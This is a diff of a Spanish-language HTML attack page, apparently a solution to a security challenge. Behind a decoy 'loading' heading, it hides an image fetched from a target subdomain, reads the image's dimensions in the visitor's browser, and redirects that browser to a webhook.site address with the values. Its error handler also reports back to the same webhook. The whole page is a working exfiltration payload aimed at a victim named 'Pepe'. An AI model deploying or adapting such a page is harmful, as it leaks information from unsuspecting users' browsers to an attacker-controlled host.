@@ -7,16 +7,10 @@
     <h1>Cargando información, por favor espere.</h1>
 
     <img id="pepe-pic" 
-         src="https://ch1-aa474a1f-daa7-42b3-85b5-6574299b4709-imagen-importante.softwareseguro.com.ar/profile-pic" 
+         src="https://chl-fe4fc56f-9d5b-4a3a-bc30-daefe886fcbf-imagen-importante.softwareseguro.com.ar/profile-pic" 
          style="display:none;">
 
     <script>
-        // Importamos la librería para calcular el MD5
-        // Necesitamos incluirla aquí para que el script funcione.
-        const script = document.createElement('script');
-        script.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js";
-        document.head.appendChild(script);
-
         // --- ¡CONFIGURA ESTA LÍNEA! ---
         const webhookUrl = "https://webhook.site/f1a8205b-e2ff-44cc-b341-33c08ab29f14";
         // ---------------------------------
@@ -29,20 +23,15 @@
             const width = this.naturalWidth;
             const height = this.naturalHeight;
             
-            // 2. Hacemos los cálculos del desafío
-            const level = width * height;
-            const hash = CryptoJS.MD5(level.toString()).toString();
-
-            // 3. Construimos la URL final con los resultados como parámetros
-            const finalUrl = `${webhookUrl}?ancho=${width}&alto=${height}&nivel=${level}&hash=${hash}`;
+            // 2. Construimos la URL final solo con el ancho y el alto
+            const finalUrl = `${webhookUrl}?ancho=${width}&alto=${height}`;
             
-            // 4. Redirigimos el navegador de Pepe a nuestro Webhook con la respuesta
+            // 3. Redirigimos el navegador de Pepe a nuestro Webhook con la respuesta
             window.location.href = finalUrl;
         };
 
         // Función de respaldo por si la imagen no carga
         img.onerror = function() {
-            // Si hay un error, al menos nos avisa
             window.location.href = `${webhookUrl}?error=No_se_pudo_cargar_la_imagen`;
         };
     </script>
